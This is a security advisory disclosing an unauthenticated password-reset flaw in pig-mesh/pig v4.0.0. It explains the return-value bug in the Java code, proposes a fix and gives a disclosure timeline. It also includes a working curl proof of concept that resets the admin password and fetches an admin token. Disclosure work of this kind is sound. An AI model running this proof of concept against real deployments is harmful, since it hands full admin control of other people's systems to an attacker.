https://github.com/pig-mesh/pig/

## Finding: Unauthenticated Arbitrary Account Password Reset via `checkPassword` Return-Value Confusion in pig-mesh/pig


## Details:

There's an unauthenticated arbitrary account password reset vulnerability in pig-mesh/pig v4.0.0. An attacker with network access to the gateway can reset any user's password — including the admin account — without supplying valid credentials.

**CVSS**: 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

Two flaws combine:

**1. `SysRegisterController` is public without authentication** (`pig-upms-biz/.../controller/SysRegisterController.java`):

```java
@Inner(value = false)   // adds /register/** to Spring Security permitAll()
@RestController
@RequestMapping("/register")
public class SysRegisterController {

    @PostMapping("/password")   // always active — no @ConditionalOnProperty
    public R<Boolean> resetUserPassword(@RequestBody RegisterUserDTO userDto) {
        return userService.resetUserPassword(userDto);
    }
}
```

**2. `checkPassword` returns `R.ok(false, msg)` on mismatch, not `R.failed(msg)`** (`SysUserServiceImpl.java`):

```java
public R<Boolean> checkPassword(String username, String password) {
    boolean matches = ENCODER.matches(password, sysUser.getPassword());
    return matches
        ? R.ok(true)
        : R.ok(false, MsgUtils.getMessage(...));  // ← should be R.failed(...)
}

public R resetUserPassword(RegisterUserDTO userDto) {
    R checkedPassword = checkPassword(userDto.getUsername(), userDto.getPassword());
    if (!checkedPassword.isOk()) {  // R.ok(false, msg).isOk() == true → never blocks
        return checkedPassword;
    }
    // password update always executes:
    this.update(...set password = ENCODER.encode(userDto.getNewpassword1())...
                   .eq(username, userDto.getUsername()));
    return R.ok();
}
```

`R.ok()` always sets `code = SUCCESS (0)`. `isOk()` checks only `code`, not the boolean `data` field. When passwords do not match, the guard `!checkedPassword.isOk()` is `false` and the update executes.

**Proof of Concept** (tested against v4.0.0):

```bash
# Reset admin password to 'Attacker@2025' — no token required
curl -X POST http://<host>:9999/admin/register/password \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong_doesnt_matter","newpassword1":"Attacker@2025"}'
# {"code":0,"msg":null,"data":true}

# Login with new password
curl -X POST http://<host>:9999/auth/oauth2/token \
  -H "Authorization: Basic cGlnOnBpZw==" \
  -d "grant_type=password&username=admin&password=Attacker@2025&scope=server"
# Returns access_token — full admin compromise
```

**Fix**: In `checkPassword`, replace `R.ok(false, msg)` with `R.failed(msg)` so `isOk()` correctly returns `false` on mismatch. Additionally, require authentication on `resetUserPassword` by removing `@Inner(value = false)` from the controller.

### Disclosure
 - 17 June 2026 - opened https://github.com/pig-mesh/pig/issues/1249
 - 18 June 2026 - redacted by maintainer who requested to be emailed instead
 - 20 July 2026 - closed as completed
 - 21 July 2026 - reported via email
 - 14 September 2026 - no response, disclosed
